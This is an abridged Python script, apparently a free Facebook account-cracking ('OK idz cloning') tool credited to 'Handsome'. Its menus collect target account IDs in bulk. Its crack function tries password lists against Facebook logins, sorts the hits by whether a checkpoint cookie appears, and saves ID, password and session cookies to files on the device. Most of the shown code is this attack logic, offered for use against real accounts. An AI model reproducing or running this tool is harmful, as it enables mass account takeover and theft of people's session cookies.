...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mSilent786')
...
══════════════════════════════════════════════════
  Author       :  Handsome
  Facebook  : Mr-Handsome
  Instagram : Handsome__official_
 TOOLS STATUS : Free 
 ══════════════════════════════════════════════════  
          {m}•{k}•{h}•{sir} WELCOME TO MR-HANDSOME WORLD {x}{m}•{k}•{h}•{x}

    \t{asu}    {m}•{k}•{h}•{sir} ENJOY FREE OK IDZ CLONING {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		os.system('xdg-open  https://facebook.com/groups/425851082902207/?ref=share')
		os.system('clear')
...
def menu(my_name,my_id):
	...
	print('2. Crack File ')
	print('E. Exit')
	_____cowok__Aadi_____ = input('\nEnter  : ')
	if _____cowok__Aadi_____ in ['1']:
		dump_massal()
	elif _____cowok__Aadi_____ in ['2']:
		crack_file()
	elif _____cowok__Aadi_____ in ['E']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('Enter Target Acount nmbr ? : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
...
def setting():
	...
	banner()
	print('')
	print('1. Crack Old (Working) ')
	print(f'2. Crack New {h} Best{h}{x}')
	print(f'3. Random {h}Lol{h}{x}')
	print('')
	hu = input('Enter  : ')
	if hu in ['1','01']:
	...
	print(f'2. mbasic.facebook(Ok Idz)')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}S-H-R---->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K} HANDSOME_CP🥺>> {idf}|{pw}{N}')
				...
				print(f'\r{H}HANDSOME_OK😘>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'HANDSOME_CP[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='Aadi-XD CP'))
					open('/sdcard/Aadi-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/Aadi-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'HANDSOME_OK🥰[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='Aadi-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/HANDSOME/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					...
					hit=0
					infoakun += (f"\n[bold yellow]HANDSOME_CP🥺[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green]HANDSOME_OK🥰[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]Aadi-XD OK[/bold green]'))
					ok+=1
					break
